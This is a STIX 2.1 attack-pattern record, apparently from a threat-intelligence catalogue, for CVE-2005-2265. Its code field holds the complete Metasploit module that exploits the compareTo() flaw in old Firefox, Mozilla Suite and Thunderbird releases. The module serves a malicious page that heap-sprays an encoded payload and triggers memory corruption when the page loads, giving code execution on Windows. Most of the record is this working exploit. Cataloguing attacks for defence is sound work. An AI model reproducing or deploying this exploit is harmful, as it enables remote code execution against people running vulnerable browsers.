{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a8fc79a5-fb1b-49b5-ab56-2618c3d689b9",
    "created": "2024-08-14T17:05:49.154628Z",
    "modified": "2024-08-14T17:05:49.154632Z",
    "name": "Mozilla Suite/Firefox compareTo() Code Execution",
    "description": " This module exploits a code execution vulnerability in the Mozilla Suite, Mozilla Firefox, and Mozilla Thunderbird applications. This exploit module is a direct port of Aviv Raff's HTML PoC.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/mozilla_compareto.rb",
            "external_id": "mozilla_compareto.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-2265"
        },
        {
            "source_name": "reference",
            "url": "http://www.mozilla.org/security/announce/mfsa2005-50.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  #\n  # This module acts as an HTTP server\n  #\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  # The version for this vuln is tricky because it affects mozilla 1.7-1.7.10\n  # and firefox 1.0-1.0.4, so we set minver and maxver to the outer bounds.\n  #autopwn_info({\n  #  :ua_name => HttpClients::FF,\n  #  :ua_minver => \"1.0\",\n  #  :ua_maxver => \"1.7.10\",\n  #  :os_name => OperatingSystems::Match::WINDOWS,\n  #  :javascript => true,\n  #  :rank => NormalRanking, # reliable memory corruption\n  #  :vuln_test => \"if (typeof InstallVersion != 'undefined') { is_vuln = true; }\",\n  #})\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Mozilla Suite/Firefox compareTo() Code Execution',\n      'Description'    => %q{\n          This module exploits a code execution vulnerability in the Mozilla\n        Suite, Mozilla Firefox, and Mozilla Thunderbird applications. This exploit\n        module is a direct port of Aviv Raff's HTML PoC.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>  ['hdm', 'Aviv Raff <avivra[at]gmail.com>'],\n      'References'     =>\n        [\n          ['CVE',    '2005-2265'],\n          ['OSVDB',  '17968'],\n          ['BID',    '14242'],\n          ['URL',    'http://www.mozilla.org/security/announce/mfsa2005-50.html'],\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 400,\n          'BadChars' => \"\\x00\",\n        },\n      'Platform'       => %w{ win },\n      'Targets'        =>\n        [\n          # Tested against Firefox 1.0.4 and Mozilla 1.7.1 on\n          # WinXP-SP3 and Win2kAS-SP0\n          [ 'Firefox < 1.0.5, Mozilla < 1.7.10, Windows',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_X86,\n              'Ret' => 0x0c0c0c0c,\n            }\n          ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2005-07-13'\n      ))\n  end\n\n  def on_request_uri(cli, request)\n\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    print_status(\"Sending #{self.name}\")\n    send_response_html(cli, generate_html(p), { 'Content-Type' => 'text/html' })\n\n    # Handle the payload\n    handler(cli)\n  end\n\n  def generate_html(payload)\n\n    enc_code = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n    enc_nops = Rex::Text.to_unescape(make_nops(4), Rex::Arch.endian(target.arch))\n\n    spray_to = sprintf(\"0x%.8x\", target.ret)\n    spray_slide1 = Rex::Text.to_unescape( [target.ret].pack('V'), Rex::Arch.endian(target.arch) )\n    spray_slide2 = Rex::Text.to_unescape( [target.ret].pack('V'), Rex::Arch.endian(target.arch) )\n    eax_address = sprintf(\"0x%.8x\", target.ret)\n\n    return %Q|\n<html>\n<head>\n<!--\n  Copyright (C) 2005-2006 Aviv Raff (with minor modifications by HDM for the MSF module)\n  From: http://aviv.raffon.net/2005/12/11/MozillaUnderestimateVulnerabilityYetAgainPlusOldVulnerabilityNewExploit.aspx\n  Greets: SkyLined, The Insider and shutdown\n-->\n  <title>One second please...</title>\n  <script language=\"javascript\">\n\n    function BodyOnLoad()\n    {\n      location.href=\"javascript:void (new InstallVersion());\";\n      CrashAndBurn();\n    };\n\n    #{js_heap_spray}\n    // The \"Heap Spraying\" is based on SkyLined InternetExploiter2 methodology\n    function CrashAndBurn()\n    {\n      // Payload - Just return..\n      var payLoadCode=unescape(\"#{enc_code}\");\n\n      // Size of the heap blocks\n      var heapBlockSize=0x400000;\n      sprayHeap(payLoadCode, #{target.ret}, heapBlockSize - (payLoadCode.length + 0x38));\n\n      // Set address to fake \"pdata\".\n      var eaxAddress = #{eax_address};\n\n      //\tThis was taken from shutdown's PoC in bugzilla\n      // struct vtbl { void (*code)(void); };\n      // struct data { struct vtbl *pvtbl; };\n      //\n      // struct data *pdata = (struct data *)(xxAddress & ~0x01);\n      // pdata->pvtbl->code(pdata);\n      //\n      (new InstallVersion).compareTo(new Number(eaxAddress >> 1));\n    }\n// -->\n  </script>\n</head>\n<body onload=\"BodyOnLoad()\">\n</body>\n</html>\n    |\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-07-13",
    "x_mitre_platforms": [
        "win'"
    ]
}